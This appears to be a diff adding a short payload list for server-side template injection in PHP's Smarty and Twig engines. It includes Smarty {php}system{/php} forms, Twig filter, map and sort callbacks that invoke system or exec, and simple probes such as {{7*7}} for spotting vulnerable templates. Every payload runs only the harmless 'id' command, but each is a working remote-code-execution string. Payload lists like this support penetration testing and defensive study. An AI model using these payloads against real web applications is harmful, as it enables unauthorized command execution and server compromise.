@@ -1,0 +1,19 @@
+# PHP SSTI Payloads (Smarty, Twig)
+
+# Smarty (Modern & Legacy)
+{php}system('id');{/php}
+{system('id')}
+{assign var='cmd' value='system'}{$cmd('id')}
+{$smarty.version}
+{$smarty.server.DOCUMENT_ROOT}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{{["id"]|sort("system")}}
+
+# Identification
+{7*7}
+{{7*7}}
+<?php echo 7*7; ?>
